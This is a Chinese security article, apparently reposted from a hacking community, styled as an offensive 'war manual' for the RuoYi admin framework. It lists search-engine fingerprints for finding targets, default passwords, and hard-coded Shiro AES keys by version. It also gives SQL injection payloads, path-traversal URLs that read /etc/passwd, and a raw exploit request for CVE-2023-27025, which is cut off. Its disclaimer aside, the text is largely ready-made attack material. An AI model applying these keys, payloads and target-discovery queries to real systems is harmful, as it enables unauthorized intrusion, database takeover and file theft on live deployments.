---
title: 若依(RuoYi)框架漏洞战争手册
url: https://mp.weixin.qq.com/s/Zq4GNRjWh2TOEa1-3lbsNQ
source: Doonsec's feed
date: 2026-01-15
fetch_date: 2026-01-16T03:26:21.176148
---

# 若依(RuoYi)框架漏洞战争手册

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSYATAXbGgR2ZibnPSJ38pYiaS9rvlv9sfUduU3cFftWVdJicqok1lDfxFw/0?wx_fmt=jpeg)

# 若依(RuoYi)框架漏洞战争手册

Locks\_
Locks\_

泷羽Sec-track

![]()

在小说阅读器中沉浸阅读

> 声明！本文章所有的工具分享仅仅只是供大家学习交流为主，切勿用于非法用途，如有任何触犯法律的行为，均与本人及团队无关！！！

**往期推荐：**

**[白嫖超级会员｜寒假弯道超车，好靶场喊你学习啦](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489093&idx=1&sn=2674f0b159fab189358e6ad83f956e06&scene=21#wechat_redirect)**

**[【工具】多平台GUI图形化资产测绘工具，支持一键导出](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489051&idx=1&sn=c1dcbe17078b6ed0bd16e7d061bae691&scene=21#wechat_redirect)**

**公众号：**

文章转载至补天社区

```
作者：Locks_
https://forum.butian.net/share/4328
```

当你在用若依时，黑客已经在用Shiro默认密钥弹你的Shell；当你还在纠结分页查询，攻击者已通过SQL注入接管数据库；而你以为安全的定时任务，不过是他们拿捏服务器的玩具。这份手册，带你用渗透的视角，解剖若依的每一处致命弱点——因为真正的安全，始于知晓如何毁灭它。

# 0x00 前言

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSTG89186R2pIdsPlBCbRRRI7l7tbFeKk8PkaGm6faRzBHagvKv6ttgA/640?wx_fmt=png&from=appmsg)

image.png

## 简介

Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。

若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCS9icpkD7OQlkNc5wSCEicaFKYZuYauwGcibguEo1RuEX4pYX98KpchicoGw/640?wx_fmt=png&from=appmsg)

image.png

## **配合ruoyi的服务：**

```
alibaba druid
alibaba nacos
spring
redis
mysql
minio
fastjson
shiro
swagger-ui.html
mybatis
```

## 搜索语法

FOFA：

```
(icon_hash="-1231872293" || icon_hash="706913071")
```

Hunter：

```
web.body="若依后台管理系统"
```

## 环境搭建

新建文件夹，拉起ruoyi源码

```
git clone https://gitee.com/y_project/RuoYi
```

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSOPmjzztfu8ia7IenRE7tWOicL1t1dTg8icpzJOFlMu3uhpml8dG5quxvQ/640?wx_fmt=png&from=appmsg)

image.png

```
cd RuoYi
切换版本
git tag -l
切换
git checkout v4.5.1
```

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSJianibRxNbRRkRbCh0icrkTicgtC0kibJY3yBiaBMDibia5n9mpiboABBhLZfOg/640?wx_fmt=png&from=appmsg)接下来用idea搭建的 mysql正常用phpstudy搭建就行 日志存放路径需要修改

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSn1IrKr1LWTxqIsliapzhM9otb6I17RSaNicr8BmbkmOzrPTvg2gz0LcQ/640?wx_fmt=png&from=appmsg)

image.png

配置mysql

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCScWELX8nYkJk06gmX7MwBhHichSVxP0NIwnWsPIVTH2dxZd9mPpFjxOw/640?wx_fmt=png&from=appmsg)

image.png

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSedEkjN0oYOxV5bG4l9QDoianib8xJ9wBChRlNIe7gHYTdyHkXa3Z8KpA/640?wx_fmt=png&from=appmsg)启动即可，默认端口80

# 0x01 弱口令

```
用户：admin ruoyi druid
密码：123456 admin druid admin123 admin888
```

# 0x02 Shiro默认密钥

## 漏洞简介

若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。

## 影响版本

RuoYi<V-4.6.2

## 漏洞复现

在配置文件中，能够看到shiro的密钥是在配置文件中的

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSJ1CrmlakMzUcljibpVeZZSfyufJnicDfZPKGZMmaqnBI6icATRXR3raPA/640?wx_fmt=png&from=appmsg)

image.png

漏洞利用工具地址 https://github.com/SummerSec/ShiroAttack2

* RuoYi-4.2版本使用的是shiro-1.4.2在该版本和该版本之后都需要勾选AES GCM模式。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSl5Sv4wPPXicSeShYXknvtl7wESPrKoVARbtjWN1rceib2JszOexibdauA/640?wx_fmt=png&from=appmsg)

image.png

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSKEwiaQg2hhlp9Tuqb3OfPuX1FZqgxMJljfp9YrUY3l8CHO6ejecghHQ/640?wx_fmt=png&from=appmsg)

image.png

| RuoYi 版本号 | 对象版本的默认AES密钥 |
| --- | --- |
| 4.6.1-4.3.1 | zSyK5Kp6PZAAjlT+eeNMlg== |
| 3.4-及以下 | fCq+/xW488hMTCD+cmJ3aQ== |

* RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。

# 0x03 SQL注入

### 注入点1 /role/list接口 （<V-4.6.2）

版本同上4.5.1 首先从源码分析一波 Mybatis配置一般用#{}，类似PreparedStatement的占位符效果，可以防止SQL注入。RuoYi则是采用了${}造成了SQL注入

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSw7GiajumFUB3SkYMuaFLEKUgwykLsxAZeW6xEpy9xPImOCVhVM8yYCg/640?wx_fmt=png&from=appmsg)跳转

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSnvtP6sIZyKb4lx6ribiakLQdSlohVzyvlxicaicgzv4jWdQJOXddza6gxA/640?wx_fmt=png&from=appmsg)解释一下 ${params.dataScope}

`${params.dataScope}`这段代码是MyBatis的动态SQL之一，主要用于在SQL查询中嵌入外部定义的字符串或参数。这里的`${...}`语法表示取出`params`对象中名为`dataScope`的属性值，并将其直接嵌入到SQL语句中。

```
例如，在一个基于角色权限管理的系统中，不同的用户可能有权限查看不同的数据记录。管理员可能可以查看所有部门的记录，而普通用户只能查看自己部门的记录。在这种情况下，`dataScope`的值可以是一个根据用户角色动态生成的SQL片段，如`"AND dept_id IN (SELECT dept_id FROM user_dept_access WHERE user_id = #{userId})"`，用以限定查询结果只包含特定部门的用户信息。
```

可以看到，在查询的时候，user的属性params是map，在xml中，将dataScope拼接到sql语句后

进入mapper层

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSlrYC1Ko85YiczO97W2eBj5uzQdFo7AK9kqWOzHH1TrK0iaERWLUE6NFw/640?wx_fmt=png&from=appmsg)

image.png

跳转到上级

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSE47grMCLsAUlBeGKdSwficBBH0OqhxiadMAiaeE8P6z3AqS4gibm7c2Rpg/640?wx_fmt=png&from=appmsg)进入role查看信息

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSaFXjZmG2WmBeibn33sicwbzh8zO7rOpe5jqjolOxSUZTn8m4Pd64u8nw/640?wx_fmt=png&from=appmsg)查看功能

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSnFhPiaggqOHWvzuQohE2KFMooVian60LaOoG04mbgBUyWg51B8wjH7Ag/640?wx_fmt=png&from=appmsg)params

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSGYWdicYE4nHvLwajHol8sFE3BW7MfsZ7ZMZadRSvgUJGo1wfiabw4icicg/640?wx_fmt=png&from=appmsg)

image.png

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSEajyLzRAAgoMdMpSLwiaFYnx71p0S7z9EYTxPXX7pFO0W2yKn695J6Q/640?wx_fmt=png&from=appmsg)

image.png

根据路径

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSpYtu5Uo9ibBicdwibict1BsdYOtwvteU5dvj7Rgn2PIAl0gz57xRFE2xNQ/640?wx_fmt=png&from=appmsg)执行代码

```
&params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
```

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSEUficxfA35YG47mqhhGDG4y3mJ68V10wgkmbfTs8MQdeY5kwcC1wNiag/640?wx_fmt=png&from=appmsg)

image.png

### 注入点2 /role/export （<V-4.6.2）

### 注入点3 /user/list （<V-4.6.2）

### 注入点4 /user/list （<V-4.6.2）

### 注入点5 /dept/list （<V-4.6.2）

### 注入点6 /role/authUser/allocatedList （<V-4.6.2）

### 注入点7 /role/authUser/unallocatedList

### 注入点8 /dept/edit （<V-4.6.2）

```
DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat(0,(select user()))));#
```

### 注入点9 /tool/gen/createTable（V-4.7.1-V-4.7.5）

参考https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93

# 0x04 CNVD-2021-01931任意文件下载

#### 漏洞简介

登录后台后可以读取服务器上的任意文件。

#### 影响版本：

RuoYi<4.5.1

#### 漏洞复现

用4.5.0版本 直接搜索关键字，download找到具体的controller 路径

```
/common/download/resource
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini
```

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSULDTzUnPRXiaIwE6ubhLXqvPmbUmf3jpdmDQVN5ARHibdeZAib2Px0plw/640?wx_fmt=png&from=appmsg)

image.png

# 0x05 CVE-2023-27025 若依任意文件下载

## 漏洞简介

该漏洞是若依（RuoYi）4.7.6 版本中存在的 **权限绕过 + 任意文件下载** 组合漏洞。攻击者通过后台管理接口添加恶意定时任务，修改系统配置文件路径，绕过下载功能的白名单限制，最终实现任意文件下载。漏洞本质是 **权限控制缺失**（允许低权限用户操作敏感接口）和 **路径校验不严**（未对动态修改的配置路径进行二次校验）的综合结果。

## 影响版本

* **若依（RuoYi）<= 4.7.6**

## 利用条件

1. **权限要求**：

* 攻击者需获取管理员 Cookie（如 `JSESSIONID`）或存在其他权限绕过漏洞。
* 若后台接口未授权即可访问，则漏洞危害升级为“未授权任意文件下载”。

2. **系统配置**：

* 目标系统启用了定时任务模块（默认开启）。

## 漏洞复现

#### 添加任务绕过白名单（自定义下载文件路径）

```
POST /monitor/job/add HTTP/1.1
Host: 10.40.107.67
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chro...